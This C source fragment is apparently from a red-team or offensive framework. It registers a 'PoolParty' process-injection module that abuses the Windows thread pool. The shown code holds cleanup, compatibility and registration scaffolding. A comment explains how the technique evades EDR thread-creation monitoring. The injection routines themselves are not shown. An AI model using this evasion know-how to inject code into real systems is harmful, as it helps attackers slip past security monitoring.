
static VOID poolparty_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(POOLPARTY_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD poolparty_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Very low risk: no thread creation at any level.
     * PsSetCreateThreadNotifyRoutine completely blind.
     * Execution occurs on legitimate pre-existing worker threads.
     * Cross-process memory alloc/write is still visible via EtwTi,
     * but the execution trigger has no dedicated kernel callback.
     * Handle duplication + worker factory query may be suspicious
     * but generates minimal EDR-specific telemetry.
     */
    return 10;
}

static BOOL poolparty_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    /* PoolParty requires Windows 10+ (thread pool v3) */
    if (ctx->os.major_version < 10) return FALSE;
    return TRUE;
}

/* ── Module definitions + auto-registration ─────────────── */

/*
 * Single unified module with variant selection.
 * YAML config selects the variant via poolparty.variant field.
 * Individual variant modules are also declared for direct use.
 */

TEKTON_MODULE tekton_mod_inject_poolparty = {
    .name           = "inject_poolparty",
    .description    = "PoolParty: thread pool abuse, no thread creation (Cat 46)",
    .category       = TEKTON_CAT_INJECT,
    .target_surface = TEKTON_SURFACE_KERNEL_CB,
    .flags          = TEKTON_MOD_DESTRUCTIVE | TEKTON_MOD_STEALTHY | TEKTON_MOD_REQUIRES_WIN10,
    .skill_ref      = "46",
    .init           = poolparty_init,
    .execute        = poolparty_execute,
    .cleanup        = poolparty_cleanup,
    .get_risk_score = poolparty_risk_score,
    .check_compat   = poolparty_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_inject_poolparty);
